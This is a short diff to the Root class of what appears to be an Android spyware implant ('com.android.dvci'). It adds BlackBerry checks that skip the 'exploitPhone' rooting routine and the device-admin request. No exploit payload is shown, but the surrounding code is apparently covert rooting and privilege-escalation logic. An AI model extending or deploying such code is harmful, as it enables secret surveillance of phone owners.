@@ -3,6 +3,7 @@ package com.android.dvci;
 import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
+import android.os.Build;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.capabilities.PackageInfo;
@@ -97,6 +98,13 @@ public class Root {
 	static public boolean shouldAskForAdmin() {
 		boolean ret = false;
 
+		if( Status.isBlackberry()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (shouldAskForAdmin) BUILD: " + Build.BOARD);
+			}
+			return false;
+		}
+
 		if (PackageInfo.checkRoot() || PackageInfo.hasSu()) {
 			ret = false;
 		} else if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) {
@@ -129,9 +137,17 @@ public class Root {
 
 	static public boolean exploitPhone(boolean synchronous) {
 
+		if( Status.isBlackberry()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (exploitPhone) BUILD: " + Build.BOARD);
+			}
+			return false;
+		}
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (exploitPhone) OS: " + android.os.Build.VERSION.SDK_INT);
 		}
+
 		method = M.e("previous");
 		if (PackageInfo.checkRoot()) {
 			if (Cfg.DEBUG) {
